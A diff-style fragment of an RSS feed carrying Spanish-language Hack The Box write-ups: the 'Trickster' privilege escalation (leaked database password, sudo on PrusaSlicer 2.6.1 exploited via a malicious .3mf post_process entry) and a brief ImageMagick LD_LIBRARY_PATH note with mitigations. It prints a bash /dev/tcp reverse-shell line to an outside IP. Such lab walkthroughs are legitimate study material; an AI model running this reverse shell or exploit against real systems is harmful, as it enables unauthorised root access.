-Ahora tenemos que inyectar la rev shell del script en el campo notifications; y somos root en el container<br><img alt="Pasted image 20250214130827.png" src="machines/trickster/imgs/pasted-image-20250214130827.png"><br>Encuentro el directorio /datastore/Backups dentro del container; no tenemos ni nc ni wget pero si python entonces puedo lanzat un servidor http y hacer otro puente ssh hacia el puerto<br>root@a4b9a36ae7ff:/datastore/Backups# python -m http.server 2000
-Serving HTTP on 0.0.0.0 port 2000 (http://0.0.0.0:20
-<br><img alt="Pasted image 20250214131310.png" src="machines/trickster/imgs/pasted-image-20250214131310.png"><br>Dentro de los backups encontramos estos archivos .br;<br><img alt="Pasted image 20250214174849.png" src="machines/trickster/imgs/pasted-image-20250214174849.png"><br>Lo descomprimimos con la herramienta <a data-tooltip-position="top" aria-label="https://github.com/google/brotli" rel="noopener nofollow" class="external-link" href="https://github.com/google/brotli" target="_blank">brotli</a> ; <br>➜  b4a8b52d-651b-44bc-bbc6-f9e8c6590103 l
-total 16K
-drwxrwxr-x 2 kali kali 4,0K ago 31 10:50 .
-drwxrwxr-x 3 kali kali 4,0K feb 14 13:14 ..
--rw-r--r-- 1 kali kali 2,6K ago 31 01:47 f04f0732f120c0cc84a993ad99decb2c.txt.br
--rw-r--r-- 1 kali kali   51 ago 31 01:47 history.txt
-➜  b4a8b52d-651b-44bc-bbc6-f9e8c6590103 brotli -d f04f0732f120c0cc84a993ad99decb2c.txt.br
-➜  b4a8b52d-651b-44bc-bbc6-f9e8c6590103 ls
-f04f0732f120c0cc84a993ad99decb2c.txt  f04f0732f120c0cc84a993ad99decb2c.txt.br  history.txt
-
-<br>en el archivo de texto encontramos la password del usuario Adam<br>
-<img alt="Pasted image 20250214175709.png" src="machines/trickster/imgs/pasted-image-20250214175709.png"><br><br>➜  b4a8b52d-651b-44bc-bbc6-f9e8c6590103 cat --plain f04f0732f120c0cc84a993ad99decb2c.txt | grep password
-                'database_password' =&gt; 'adam_admin992' ,                                                                                                               
-                'mailer_password' =&gt; NULL ,                                                                                                                            
-➜  b4a8b52d-651b-44bc-bbc6-f9e8c6590103 ssh adam@trickster.htb
-adam@trickster.htb's password: 
-adam@trickster:~$ id
-uid=1002(adam) gid=1002(adam) groups=1002(adam)
-adam@trickster:~$ whoami
-adam
-adam@trickster:~$ 
-<br>Adam puede usar sudo en :<br>adam@trickster:~$ sudo -l
-Matching Defaults entries for adam on trickster:
-    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
-    use_pty
-
-User adam may run the following commands on trickster:
-    (ALL) NOPASSWD: /opt/PrusaSlicer/prusaslicer
-<br>El binario no aparece en GTFObins; una busqueda en google me indica que igual es un binario relacionado con la gestion de impresoras 3D;<br>
-<img alt="Pasted image 20250214181500.png" src="machines/trickster/imgs/pasted-image-20250214181500.png"><br>Le realizamos un string <br>adam@trickster:~$ strings /opt/PrusaSlicer/prusaslicer | grep print
-sprintf
-fprintf
-appimage_print_binary
-appimage_print_hex
-print_help
-  --appimage-mount                Mount embedded filesystem image and print
-
-<br>adam@trickster:~$ /opt/PrusaSlicer/prusaslicer
-DISPLAY not set, GUI mode not available.
-
-PrusaSlicer-2.6.1+linux-x64-GTK2-202309060801 based on Slic3r (with GUI support)
-https://github.com/prusa3d/PrusaSlicer
-
-Usage: prusa-slicer [ ACTIONS ] [ TRANSFORM ] [ OPTIONS ] [ file.stl ... ]
-
-Actions:
- --export-3mf        Export the model(s) as 3MF.
- --export-amf        Export the model(s) as AMF.
- --export-gcode, --gcode, -g
-                     Slice the model and export toolpaths as G-code.
- --export-obj        Export the model(s) as OBJ.
- --export-sla, --sla Slice the model and export SLA printing layers as PNG.
- --export-stl        Export the model(s) as STL.
- --gcodeviewer       Visualize an already sliced and saved G-code
- --help, -h          Show this help.
- --help-fff          Show the full list of print/G-code configuration options.
- --help-sla          Show the full list of SLA print configuration options.
- --info              Write information about the model to the console.
- --opengl-debug      Activate OpenGL debug output on graphic cards which support it
- --opengl-version ABCD
-                     Select a specific version of OpenGL
- --save ABCD         Save configuration to the specified file.
- --slice, -s         Slice the model as FFF or SLA based on the printer_technology configuration
-                     value.
-
-Transform options:
- --align-xy X,Y      Align the model to the given point.
- --center X,Y        Center the print around the given center.
- --cut N             Cut model at the given Z.
- --delete-after-load ABCD
-                     Delete files after loading.
- --dont-arrange      Do not rearrange the given models before merging and keep their original XY
-                     coordinates.
- --duplicate N       Multiply copies by this factor.
- --duplicate-grid X,Y
-                     Multiply copies by creating a grid.
- --ensure-on-bed     Lift the object above the bed when it is partially below. Enabled by default,
-                     use --no-ensure-on-bed to disable.
- --merge, -m         Arrange the supplied models in a plate and merge them in a single model in order
-                     to perform actions once.
- --repair            Try to repair any non-manifold meshes (this option is implicitly added whenever
-                     we need to slice the model to perform the requested action).
- --rotate N          Rotation angle around the Z axis in degrees.
- --rotate-x N        Rotation angle around the X axis in degrees.
- --rotate-y N        Rotation angle around the Y axis in degrees.
- --scale N           Scaling factor or percentage.
- --scale-to-fit X,Y,Z
-                     Scale to fit the given volume.
- --split             Detect unconnected parts in the given model(s) and split them into separate
-                     objects.
-
-Other options:
- --config-compatibility
-                     This version of PrusaSlicer may not understand configurations produced by the
-                     newest PrusaSlicer versions. For example, newer PrusaSlicer may extend the list
-                     of supported firmware flavors. One may decide to bail out or to substitute an
-                     unknown value with a default silently or verbosely. (disable, enable,
-                     enable_silent; default: enable)
- --datadir ABCD      Load and store settings at the given directory. This is useful for maintaining
-                     different profiles or including configurations from a network storage.
- --ignore-nonexistent-config
-                     Do not fail if a file supplied to --load does not exist.
- --load ABCD         Load configuration from the specified file. It can be used more than once to
-                     load options from multiple files.
- --loglevel N        Sets logging sensitivity. 0:fatal, 1:error, 2:warning, 3:info, 4:debug, 5:trace
-                     For example. loglevel=2 logs fatal, error and warning level messages.
- --output ABCD, -o ABCD
-                     The file where the output will be written (if not specified, it will be based on
-                     the input file).
- --single-instance   If enabled, the command line arguments are sent to an existing instance of GUI
-                     PrusaSlicer, or an existing PrusaSlicer window is activated. Overrides the
-                     "single_instance" configuration value from application preferences.
-
-Print options are processed in the following order:
-  1) Config keys from the command line, for example --fill-pattern=stars
-     (highest priority, overwrites everything below)
-  2) Config files loaded with --load
-  3) Config values loaded from amf or 3mf files
-
-Run --help-fff / --help-sla to see the full listing of print options.
-
-<br>La version del programa es vulnerable ; (PrusaSlicer-2.6.1)<br>
-Vemos que se puede ejecutar código arbitrario observando la versión del programa en <a data-tooltip-position="top" aria-label="https://www.exploit-db.com/exploits/51983" rel="noopener nofollow" class="external-link" href="https://www.exploit-db.com/exploits/51983" target="_blank">exploit-db</a><br><br>Segun <a data-tooltip-position="top" aria-label="https://www.exploit-db.com/exploits/51983" rel="noopener nofollow" class="external-link" href="https://www.exploit-db.com/exploits/51983" target="_blank">exploit-db</a>:<br>For the linux PoC, this CLI command is enough to execute the payload contained in the project. './prusa-slicer -s code-exec-linux.3mf'. After slicing, a new file '/tmp/hax' will be created. This particular PoC contains this 'post_process' entry in the 'Slic3r_PE.config' file:  
-<br>El exploit  permite la ejecución de código arbitrario al manipular el archivo Slic3r_PE.config dentro de un proyecto .3mf de PrusaSlicer.<br>El archivo Slic3r_PE.config es donde se define la configuración del proyecto y contiene la entrada post_process, que se utiliza para ejecutar scripts después de generar el archivo G-code. En este caso, modificaremos esta entrada para incluir nuestro payload .<br>Slic3r_PE.config:<br>; post_process = "/usr/bin/id &gt; /tmp/hax #\necho 'arbitrary code execution! (x_x)'&gt;&gt; /tmp/hax #"
-<br><br>En el siguiente repositorio de github ya tenemos un archivo .3mf malicioso<br>
-<a rel="noopener nofollow" class="external-link" href="https://github.com/suce0155/prusaslicer_exploit.git" target="_blank">https://github.com/suce0155/prusaslicer_exploit.git</a><br>Lo descomprimimos y observamos el arbol de directorio de los archivos .3mf y como este ejecuta el codigo arbitrario;<br>Para extraerlo usamos unzip o 7z cualquiera vale;<br>total 64K
-drwxrwxr-x 4 kali kali 4,0K feb 14 20:00 .
-drwxrwxr-x 6 kali kali 4,0K feb 14 19:52 ..
--rw-rw-r-- 1 kali kali  39K feb 14 19:52 evil.3mf
--rw-rw-r-- 1 kali kali   42 feb 14 19:52 exploit.sh
-drwxrwxr-x 5 kali kali 4,0K feb 14 20:00 Extracted
-drwxrwxr-x 8 kali kali 4,0K feb 14 19:52 .git
--rw-rw-r-- 1 kali kali  369 feb 14 19:52 README.md
-➜  prusaslicer_exploit git:(main) ✗ tree Extracted 
-Extracted
-├── 3D
-│   └── 3dmodel.model
-├── [Content_Types].xml
-├── Metadata
-│   ├── Slic3r_PE.config
-│   ├── Slic3r_PE_model.config
-│   └── thumbnail.png
-└── _rels
-
-4 directories, 5 files
-
-<br>El exploit esta en el archivo Slic3r_PE.config que es el que ejecuta codigo arbitrario<br> cat Extracted/Metadata/Slic3r_PE.config | grep tmp
-; post_process = "chmod +x /tmp/exploit.sh";"bash /tmp/exploit.sh"
-<br>El exploit le da permiso a un archivo /tmp/exploit.sh y lo ejecuta con bash<br>Modificamos exploit.sh y lo movemos a /tmp<br>adam@trickster:~/prusaslicer_exploit$ cat /tmp/exploit.sh 
-/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.232/2323 0&gt;&amp;1
-<br><br><img alt="Pasted image 20250215133235.png" src="machines/trickster/imgs/pasted-image-20250215133235.png">]]></description><link>machines/trickster/2.privesc.html</link><guid isPermaLink="false">Machines/Trickster/2.PrivEsc.md</guid><pubDate>Sat, 15 Feb 2025 12:37:35 GMT</pubDate><enclosure url="machines/trickster/imgs/pasted-image-20250213163524.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;machines/trickster/imgs/pasted-image-20250213163524.png&quot;&gt;&lt;/figure&gt;</content:encoded></item></channel></rss>
+<br><br><br>
+<br>La aplicación AppImage de ImageMagick puede cargar incorrectamente libxcb.so.1 desde un directorio controlado por el atacante debido a un manejo inadecuado de la variable de entorno LD_LIBRARY_PATH.
+<br>Cuando ImageMagick se ejecuta, carga la biblioteca maliciosa, lo que desencadena la escalada de privilegios.
+<br><br><br>
+<br>Actualiza ImageMagick a la versión 7.1.1-36 o superior.
+<br>Restringir el abuso de variables de entorno (LD_LIBRARY_PATH).
+<br>Este enfoque corrige la vulnerabilidad al evitar que se carguen bibliotecas no deseadas y limitando el uso indebido de variables de entorno.]]></description><link>machines/titanic/2.privesc.html</link><guid isPermaLink="false">Machines/Titanic/2.PrivESC.md</guid><pubDate>Mon, 17 Feb 2025 20:19:17 GMT</pubDate><enclosure url="machines/titanic/imgs/fuck.gif" length="0" type="image/gif"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;machines/titanic/imgs/fuck.gif&quot;&gt;&lt;/figure&gt;</content:encoded></item></channel></rss>
